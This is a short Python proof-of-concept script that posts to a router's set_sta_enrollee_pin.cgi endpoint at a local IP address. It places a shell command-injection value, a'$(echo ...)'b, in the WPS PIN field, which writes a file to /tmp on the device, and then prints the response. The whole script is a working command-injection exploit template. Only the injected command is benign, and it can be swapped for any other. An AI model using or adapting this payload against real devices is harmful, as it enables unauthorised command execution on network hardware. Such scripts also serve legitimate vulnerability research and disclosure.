#!/usr/bin/env python3

import requests

ip = "http://192.168.0.1/"

url = ip + 'set_sta_enrollee_pin.cgi'

command = "a'$(echo 4 > /tmp/hello4)'b"

payload = {
    "wps_sta_enrollee_pin": command,
    "html_response_page": "do_wps.asp",
    "html_response_return_page": "do_wps.asp",
}

r = requests.post(url, data=payload)
print(r.headers)
print(r.text)
